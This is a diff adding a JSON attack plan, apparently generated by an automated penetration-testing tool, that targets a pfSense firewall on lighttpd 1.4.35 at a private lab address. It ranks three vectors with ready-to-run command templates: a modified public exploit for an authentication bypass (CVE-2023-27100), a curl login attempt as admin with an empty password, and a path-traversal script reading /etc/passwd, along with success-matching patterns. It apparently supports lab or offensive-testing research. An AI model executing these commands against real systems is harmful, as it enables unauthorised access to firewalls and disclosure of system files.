@@ -1,0 +1,114 @@
+{
+  "plan_id": "plan_20241221_001",
+  "target_ip": "10.129.2.87",
+  "context_hash": "pfsense_lighttpd_1435_php_auth",
+  "attack_vectors": [
+    {
+      "vector_id": "vec_01",
+      "priority": 1,
+      "action": {
+        "tool_name": "web_exploit_runner",
+        "command_template": "python3 exploits/edb-51352-modified.py --target https://{target} --bypass-filters",
+        "parameters": {
+          "target": "10.129.2.87",
+          "port": 443,
+          "ssl_verify": false
+        },
+        "timeout_seconds": 30
+      },
+      "prediction_metrics": {
+        "classification": {
+          "attack_type": "Authentication_Bypass",
+          "mitre_id": "T1190",
+          "cve_id": "CVE-2023-27100"
+        },
+        "hypothesis": {
+          "confidence_score": 0.65,
+          "rationale_tags": [
+            "pfsense_confirmed",
+            "lighttpd_1435",
+            "php_login",
+            "expired_ssl"
+          ],
+          "expected_success": true
+        },
+        "success_criteria": {
+          "match_type": "regex_match",
+          "match_pattern": "(admin|dashboard|authenticated|session)",
+          "negative_pattern": "(401 Unauthorized|403 Forbidden|login failed)"
+        }
+      }
+    },
+    {
+      "vector_id": "vec_02",
+      "priority": 2,
+      "action": {
+        "tool_name": "web_exploit_runner",
+        "command_template": "curl -k -X POST https://{target}/index.php -d 'usernamefld=admin&passwordfld=' --cookie-jar cookies.txt",
+        "parameters": {
+          "target": "10.129.2.87",
+          "method": "POST",
+          "data": "default_creds_test"
+        },
+        "timeout_seconds": 15
+      },
+      "prediction_metrics": {
+        "classification": {
+          "attack_type": "Credential_Attack",
+          "mitre_id": "T1110",
+          "cve_id": "N/A"
+        },
+        "hypothesis": {
+          "confidence_score": 0.45,
+          "rationale_tags": [
+            "default_creds",
+            "pfsense_common",
+            "weak_auth"
+          ],
+          "expected_success": false
+        },
+        "success_criteria": {
+          "match_type": "status_code",
+          "match_pattern": "200|302",
+          "negative_pattern": "401|403|invalid"
+        }
+      }
+    },
+    {
+      "vector_id": "vec_03",
+      "priority": 3,
+      "action": {
+        "tool_name": "web_exploit_runner",
+        "command_template": "python3 exploits/lighttpd_path_traversal.py --target https://{target} --ssl-no-verify",
+        "parameters": {
+          "target": "10.129.2.87",
+          "port": 443,
+          "path": "../../../etc/passwd"
+        },
+        "timeout_seconds": 20
+      },
+      "prediction_metrics": {
+        "classification": {
+          "attack_type": "Path_Traversal",
+          "mitre_id": "T1083",
+          "cve_id": "Unknown"
+        },
+        "hypothesis": {
+          "confidence_score": 0.35,
+          "rationale_tags": [
+            "lighttpd_1435",
+            "outdated_version",
+            "file_access"
+          ],
+          "expected_success": false
+        },
+        "success_criteria": {
+          "match_type": "regex_match",
+          "match_pattern": "(root:|daemon:|www:)",
+          "negative_pattern": "(404|403|Not Found)"
+        }
+      }
+    }
+  ],
+  "created_at": "2024-12-21T10:30:00Z"
+}
